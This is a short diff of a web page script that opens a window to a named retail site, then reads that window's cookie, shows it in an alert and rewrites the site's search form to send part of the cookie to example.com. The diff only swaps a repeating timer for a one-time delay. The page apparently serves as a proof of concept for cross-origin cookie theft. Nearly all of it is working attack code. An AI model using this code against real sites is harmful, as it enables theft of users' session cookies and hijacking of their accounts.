@@ -4,10 +4,10 @@
   <script>
 	function doJob(){
 		var child = window.open("https://www.bhphotovideo.com");
-         setInterval(function() {
+         setTimeout(function() {
 			    child.document.getElementsByClassName('js-siteSearch')[0].action="https://example.com?c="+child.document.cookie.substring(1,10);
 			    alert(child.document.cookie);
-         }, 2000);
+         }, 3000);
 	}  
   </script>
 </head>
